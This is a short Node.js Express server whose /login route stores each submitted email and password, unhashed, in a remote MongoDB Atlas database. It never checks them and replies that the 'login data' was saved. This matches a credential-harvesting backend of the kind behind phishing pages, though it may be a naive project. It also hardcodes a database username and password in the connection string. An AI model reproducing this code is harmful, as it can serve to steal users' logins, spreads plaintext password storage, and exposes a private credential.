const express = require("express");
const mongodb = require("mongodb");

const app = express();
const port = 3001; // You can change this port number if needed

// MongoDB connection URI
const mongoURI =
  "mongodb+srv://insaneengineer6:mZ7hrFDI0eERyqAt@logindata.9dehod7.mongodb.net/users";

// Middleware to parse JSON request bodies
app.use(express.json());

// Handle login form submission
app.post("/login", async (req, res) => {
  try {
    // Connect to MongoDB
    const client = await mongodb.connect(mongoURI);
    const db = client.db();

    // Get the form data from the request body
    const { email, password } = req.body;

    // Save the data to the "users" collection
    const collection = db.collection("users");
    await collection.insertOne({ email, password });

    // Close the MongoDB connection
    client.close();

    res.status(200).json({ message: "Login data saved successfully" });
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: "An error occurred" });
  }
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
